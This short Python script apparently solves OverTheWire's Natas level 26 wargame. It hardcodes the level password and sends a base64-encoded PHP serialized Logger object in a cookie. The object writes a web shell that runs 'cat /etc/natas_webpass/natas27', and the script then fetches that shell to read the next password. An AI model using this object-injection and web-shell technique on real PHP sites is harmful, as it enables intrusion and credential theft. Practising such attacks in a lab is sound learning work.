import requests, re
import base64
import urllib
u='natas26'
p='oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
l=f'http://{u}.natas.labs.overthewire.org/'
sess=requests.Session()
resp=sess.get(l,auth=(u, p))
#print(base64.b64decode(requests.utils.unquote(drawing)))
sess.cookies['drawing']='Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNzoiaW1nL21pa2V5MjUyMC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxMToia25vY2trbm9jawoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
resp=sess.get(l+'?x1=0&y1=0&x2=500&y2=500',auth=(u, p))
resp=sess.get(l+'img/mikey2520.php',auth=(u, p))
print(resp.text)
